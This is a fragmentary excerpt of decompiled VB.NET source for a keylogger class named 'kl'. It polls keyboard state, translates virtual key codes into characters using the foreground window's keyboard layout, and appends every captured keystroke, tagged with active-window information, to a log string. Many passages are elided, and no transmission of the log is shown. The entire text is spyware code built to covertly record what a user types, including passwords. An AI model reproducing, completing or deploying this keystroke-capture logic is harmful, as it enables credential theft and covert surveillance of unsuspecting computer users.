	...
	Public Class kl
		...
		Private Function AV() As String
			Try
				...
				kl.GetWindowThreadProcessId(foregroundWindow, processId)
		...
		Private Function Fix(k As Keys) As String
			...
			Try
				...
				Else
					...
					End If
					result = kl.VKCodeToUnicode(CUInt(k))
				End If
			Catch ex As Exception
				Dim flag3 As Boolean = flag
				If flag3 Then
					result = Strings.ChrW(CInt(k)).ToString().ToUpper()
					Return result
				End If
				result = Strings.ChrW(CInt(k)).ToString().ToLower()
			End Try
			Return result
		End Function
		...
		Private Shared Function VKCodeToUnicode(a As UInteger) As String
			Try
				...
				If flag Then
					Return ""
				End If
				Dim b As UInteger = kl.MapVirtualKey(a, 0UI)
				Dim num As Integer = 0
				Dim g As IntPtr = CType(kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), num)), IntPtr)
				kl.ToUnicodeEx(a, b, array, stringBuilder, 5, 0UI, g)
			...
			Try
				While True
					...
					Do
						...
						If flag Then
							Dim k As Keys = CType(num2, Keys)
							Dim text As String = Me.Fix(k)
							flag = (text.Length > 0)
							If flag Then
								Me.Logs += Me.AV()
								Me.Logs += text
